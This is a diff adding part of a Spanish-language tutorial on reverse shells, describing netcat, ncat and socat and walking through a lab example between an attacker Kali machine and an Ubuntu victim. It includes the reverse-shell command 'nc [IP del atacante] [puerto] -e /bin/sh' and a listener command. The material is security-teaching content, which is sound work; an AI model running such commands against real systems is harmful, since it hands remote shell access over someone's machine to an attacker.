@@ -23,3 +23,29 @@ El proceso para establecer una shell reversa generalmente involucra los siguient
 
 
 El web https://www.revshells.com/ es una herramienta en línea que genera shell reversas. Permite a los usuarios configurar y obtener comandos para establecer shells reversas. Ofrece opciones para diferentes sistemas operativos y shells, incluyendo ajustes avanzados como el tipo de codificación.
+
+### 1. Shell Reversas en Linux con netcat y bash
+nc, abreviatura de Netcat, es una herramienta de red versátil conocida como el "navaja suiza" de la administración de redes. Permite leer y escribir datos a través de conexiones de red usando los protocolos TCP o UDP. Es ampliamente utilizada para la creación de conexiones de red entre hosts, ya sea para fines de diagnóstico, administración de redes, o como parte de técnicas de explotación o pruebas de seguridad. Netcat es capaz de abrir conexiones, escuchar puertos TCP o UDP, conectarlos, enviar datos sin procesar a través de las redes, y crear túneles. Es altamente valorado por su simplicidad y efectividad en tareas como la transferencia de archivos, la creación de backdoors, o como cliente y servidor para pruebas de red. 
+
+**Otras herramientas más modernas como:**
+- ncat: Ncat es una herramienta de red mejorada y más segura que es parte del proyecto Nmap. Ofrece funcionalidades similares a Netcat, pero con características adicionales como el cifrado SSL para conexiones seguras, autenticación fácil, y la capacidad de manejar simultáneamente múltiples conexiones. Ncat es versátil para la depuración de redes, exploración, y como un componente en scripts de pruebas de seguridad. Su diseño moderno y las mejoras de seguridad lo hacen una elección preferente para profesionales de la seguridad informática.
+- Socat: Es una herramienta de línea de comandos que permite el establecimiento de dos flujos de datos bidireccionales. Es similar a Netcat pero más complejo y potente, ofreciendo características como la creación de túneles seguros, la transferencia de datos entre diferentes protocolos (por ejemplo, TCP, UDP, UNIX sockets), y la posibilidad de ejecutar scripts o comandos a través de su conexión. Socat es ampliamente utilizado por administradores de sistemas y profesionales de seguridad para diagnósticos de red, pruebas, y como un potente instrumento para diversas tareas de red.
+
+#### Ejemplo con netcat
+Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como en la víctima (ubuntu):
+- En la máquina atacante (Kali), iniciamos Netcat en modo escucha especificando un puerto:
+  ```
+  nc -lnvp 9000
+  ```
+  l: arranca netcat en modo escucha (listen mode).
+  n: indica que se utilice el modo numérico (evita la resolución de nombres DNS, lo que acelera el proceso).
+  v: establece el modo verbose, lo que permite ver quién se conecta al servidor.
+  p: para indicar el puerto.
+
+- En la máquina objetivo (Ubuntu), usamos Netcat para conectarte a la dirección IP de la máquina atacante y el puerto especificado, redireccionando la shell a esta conexión.
+  ```
+  nc [IP del atacante] [puerto] -e /bin/sh
+  ```
+  e: para ejecutar una shell reversa. También podríamos usar la opcioin -c
+Tras establecer la conexión, podrás ejecutar comandos en la máquina objetivo desde la máquina atacante.
+En la máquina atacante se arranca netcat en modo escucha para experar la conexión del cliente.
